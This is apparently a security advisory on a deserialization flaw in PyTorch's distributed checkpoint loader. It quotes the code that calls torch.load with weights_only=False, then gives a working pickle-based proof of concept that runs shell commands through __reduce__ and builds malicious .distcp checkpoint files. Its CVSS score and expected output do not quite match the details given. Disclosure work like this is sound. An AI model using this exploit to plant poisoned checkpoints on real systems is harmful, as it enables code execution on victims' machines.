# PyTorch Distributed Checkpoint torch.load()

PyTorch's `DefaultLoadPlanner.load_bytes()` in `torch/distributed/checkpoint/default_planner.py` uses `torch.load()` with `weights_only=False` to deserialize non-tensor data from checkpoint files without any validation. This allows arbitrary Python code execution when loading malicious checkpoints.

## Vulnerability Details

**File**: `torch/distributed/checkpoint/default_planner.py`
**Function**: `DefaultLoadPlanner.load_bytes()`
**Line**: 367-372

### Vulnerable Code

```python
def load_bytes(self, read_item: ReadItem, value: io.BytesIO) -> None:
    if self.flatten_state_dict:
        set_element(
            self.original_state_dict,
            self.mappings[read_item.dest_index.fqn],
            torch.load(value, weights_only=False),  # VULNERABLE
        )
    else:
        self.state_dict[read_item.dest_index.fqn] = torch.load(
            value, weights_only=False  # VULNERABLE
        )
```

### Root Cause

The `torch.load()` function internally uses `pickle` for deserialization. When `weights_only=False`, it allows loading arbitrary Python objects (not just tensors). When `pickle` deserializes an object with a `__reduce__()` method, that method is automatically invoked, allowing arbitrary code execution.

The `value` parameter comes from user-controlled checkpoint files (`.distcp` files containing BYTE_IO type data), and there is no validation before passing it to `torch.load()`.

### Data Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ Entry Point: Attacker creates malicious checkpoint              │
├─────────────────────────────────────────────────────────────────┤
│ checkpoint_dir/                                                 │
│   ├── .metadata  (pickle data)                                  │
│   └── .0.distcp  (contains malicious .pt data)                 │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Propagation: Victim loads checkpoint                           │
├─────────────────────────────────────────────────────────────────┤
│ FileSystemReader.read_data()                                   │
│   → Reads .0.distcp file content                                │
│   → if req.type == LoadItemType.BYTE_IO:                       │
│     → planner.load_bytes(req, read_bytes)                      │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Sink Point: Code execution                                     │
├─────────────────────────────────────────────────────────────────┤
│ DefaultLoadPlanner.load_bytes()                                 │
│   → torch.load(value, weights_only=False)                      │
│     → pickle.load() deserializes                                │
│       → MaliciousClass.__reduce__() invoked                     │
│         → os.system('malicious_command')  ← RCE!               │
└─────────────────────────────────────────────────────────────────┘
```

### Attack Scenarios

1. **HuggingFace Model Poisoning**: Attacker uploads malicious checkpoint to HuggingFace Hub
2. **MLOps Platform Upload**: Web service allows checkpoint uploads without validation
3. **Shared Storage Poisoning**: Team uses shared NFS/S3 for checkpoints

### Impact

- Remote Code Execution (RCE)
- GPU cluster compromise
- Training data theft
- Model poisoning
- Supply chain attacks
```

### Proof of Concept

```python
#!/usr/bin/env python3
"""
PyTorch Distributed Checkpoint RCE PoC
Vulnerability: torch.load(weights_only=False) in default_planner.py
"""

import os
import torch
import pickle
import tempfile
from pathlib import Path


class MaliciousPayload:
    """Malicious class that executes code during deserialization"""
    def __reduce__(self):
        return (os.system, (
            'echo "RCE_VIA_TORCH_LOAD" && touch /tmp/torch_load_pwned'
        ,))


def create_malicious_checkpoint():
    """Create malicious checkpoint with BYTE_IO data"""
    checkpoint_dir = tempfile.mkdtemp(prefix="pytorch_malicious_")

    # Step 1: Create malicious .pt file
    malicious_file = Path(checkpoint_dir) / "malicious.pt"
    torch.save(MaliciousPayload(), malicious_file)

    # Step 2: Read the malicious file as bytes
    with open(malicious_file, 'rb') as f:
        malicious_data = f.read()

    # Step 3: Create .distcp file with malicious content
    distcp_file = Path(checkpoint_dir) / ".0.distcp"
    with open(distcp_file, 'wb') as f:
        f.write(malicious_data)

    print(f"[+] Malicious checkpoint created: {checkpoint_dir}")
    return checkpoint_dir


def exploit():
    """Trigger the vulnerability"""
    # First, demonstrate torch.load vulnerability directly
    print("\n[*] Testing torch.load(weights_only=False)...")

    malicious_file = tempfile.mktemp(suffix='.pt')
    torch.save(MaliciousPayload(), malicious_file)

    # This is what DefaultLoadPlanner.load_bytes() does
    result = torch.load(malicious_file, weights_only=False)

    if os.path.exists('/tmp/torch_load_pwned'):
        print("[+] RCE successful! /tmp/torch_load_pwned created")
        with open('/tmp/torch_load_pwned', 'r') as f:
            print(f"[+] Output: {f.read()}")
        os.remove('/tmp/torch_load_pwned')
        return True

    os.remove(malicious_file)
    return False


if __name__ == "__main__":
    print("=" * 60)
    print("PyTorch torch.load() RCE PoC")
    print("=" * 60)
    exploit()
```

**Expected Output**:
```
[!] RCE_VIA_TORCH_LOAD
[+] RCE successful! /tmp/torch_load_pwned created
```

### Impact

```markdown
This vulnerability allows attackers to:

1. **Execute arbitrary code** on systems loading untrusted checkpoints
2. **Compromise GPU training clusters** - code runs with full system privileges
3. **Steal training data and model weights** - exfiltrate sensitive AI models
4. **Poison models** - inject backdoors into ML models
5. **Supply chain attacks** - distribute malicious models via HuggingFace/GitHub

**Affected Users**:
- Researchers downloading models from HuggingFace Hub
- Teams using shared storage (NFS/S3) for checkpoints
- MLOps platforms that accept checkpoint uploads
- Anyone using `torch.distributed.checkpoint.load()` with default planner

**Severity**: HIGH (CVSS 8.8)
- No authentication required
- Exploitable via network (HuggingFace downloads)
- High impact (complete system compromise)
- No user interaction required (automated loading)
```

---

## CVSS

| 字段 | 值 | 说明 |
|:-----|:-----|:-----|
| Attack Vector | Network | 可通过网络下载恶意模型触发 |
| Attack Complexity | Low | 无需特殊技巧，构造恶意文件即可 |
| Privileges Required | None | 无需认证 |
| User Interaction | None | 加载过程自动完成 |
| Scope | Unchanged | 影响范围仅限于当前系统 |
| Confidentiality | High | 可窃取训练数据/模型 |
| Integrity | High | 可投毒模型 |
| Availability | High | 可破坏系统 |

**CVSS 评分**: 8.8 (High)

